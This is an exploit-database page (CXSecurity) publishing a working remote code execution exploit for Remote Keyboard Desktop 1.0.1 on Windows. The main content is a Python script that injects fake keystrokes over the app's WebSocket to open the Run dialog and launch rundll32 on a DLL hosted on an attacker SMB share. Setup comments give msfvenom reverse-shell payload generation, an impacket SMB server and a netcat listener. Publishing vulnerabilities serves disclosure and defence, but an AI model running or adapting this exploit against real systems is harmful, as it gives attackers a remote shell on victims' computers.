---
title: Remote Keyboard Desktop 1.0.1 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025050042
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-23
fetch_date: 2025-10-06T22:26:45.052053
---

# Remote Keyboard Desktop 1.0.1 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Remote Keyboard Desktop 1.0.1 Remote Code Execution (RCE)** **2025.05.22**  Credit:  **[Chokri Hammedi](https://cxsecurity.com/author/Chokri%2BHammedi/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Remote Keyboard Desktop 1.0.1 - Remote Code Execution (RCE)
# Date: 05/17/2025
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://remotecontrolio.web.app/
# Software Link: https://apps.microsoft.com/detail/9n0jw8v5sc9m?hl=neutral&gl=US&ocid=pdpshare
# Version: 1.0.1
# Tested on: Windows 10 Pro Build 19045
# Start Remote Keyboard Desktop on your windows
# Preparing:
#
# 1. Generating payload (dll/exe):
# msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.8.105 LPORT=8080 -f dll > shell.dll
# 2. Start smb server: impacket-smbserver SHARE . -smb2support
# 3. nc -lnvp 8080
# 4. python exploit.py
#####
#!/usr/bin/env python3
import websocket
import json
import time
target = "192.168.8.105"
lhost = "192.168.8.101"
WS\_URL = f"ws://{target}:8080/"
payload = "shell2.dll" # payload dll/exe filename
debug = False
HEADER\_LIST = [
"User-Agent: Dart/3.7 (dart:io)",
f"Origin: http://{target}:8080",
"Sec-WebSocket-Extensions: permessage-deflate; client\_max\_window\_bits"
]
#SMB\_PATH = f"cmd /c \\\\{lhost}\\SHARE\\{payload}" # exe based
SMB\_PATH = f"rundll32.exe \\\\{lhost}\\SHARE\\{payload},ExportedFunc" # dll
based
special\_mapping = {
' ': ("SPACE", False),
'/': ("NUMPAD\_DIVIDE", False),
'\\': ("\\", False),
'.': ("NUMPAD\_DECIMAL", False),
',': (",", False),
}
def send\_key\_event(ws, key, key\_down):
event = {"command": "keyboard\_event", "data": {"key": key, "keyDown":
key\_down, "capsLock": False}}
ws.send(json.dumps(event))
def send\_text(ws, text, delay=0.05):
shift\_pressed = False
for ch in text:
if ch in special\_mapping:
key\_name, need\_shift = special\_mapping[ch]
elif ch.isalpha():
need\_shift = ch.isupper()
key\_name = ch.upper()
elif ch.isdigit():
key\_name = ch
need\_shift = False
else:
raise ValueError(f"No key mapping for character: {ch!r}")
if need\_shift and not shift\_pressed:
send\_key\_event(ws, "SHIFT", True)
shift\_pressed = True
elif not need\_shift and shift\_pressed:
send\_key\_event(ws, "SHIFT", False)
shift\_pressed = False
send\_key\_event(ws, key\_name, True)
send\_key\_event(ws, key\_name, False)
time.sleep(delay)
if shift\_pressed:
send\_key\_event(ws, "SHIFT", False)
def send\_key(ws, keys, delay=0.05):
for key in keys:
send\_key\_event(ws, key, True)
time.sleep(delay)
for key in reversed(keys):
send\_key\_event(ws, key, False)
def on\_open(ws):
print ("Let's start!")
send\_key(ws, ["LEFT\_WINDOWS", "R"])
time.sleep(0.5)
send\_text(ws, SMB\_PATH)
send\_key(ws, ["RETURN"])
print ("Executing...")
time.sleep(1.2)
print("Check your listener!")
if debug:
print("\033[42;37mExploit by blue0x1 - github.com/blue0x1\033[0m
")
ws.close()
def on\_message(ws, message):
if debug:
print("[=] Received:", message)
def on\_error(ws, error):
if debug:
print("[!] Error:", error)
def on\_close(ws, code, reason):
if debug:
print(f"[x] Closed: {code} - {reason}")
if \_\_name\_\_ == "\_\_main\_\_":
websocket.enableTrace(debug)
ws = websocket.WebSocketApp(
WS\_URL,
header=HEADER\_LIST,
on\_open=on\_open,
on\_message=on\_message,
on\_error=on\_error,
on\_close=on\_close
)
ws.run\_forever()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050042)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top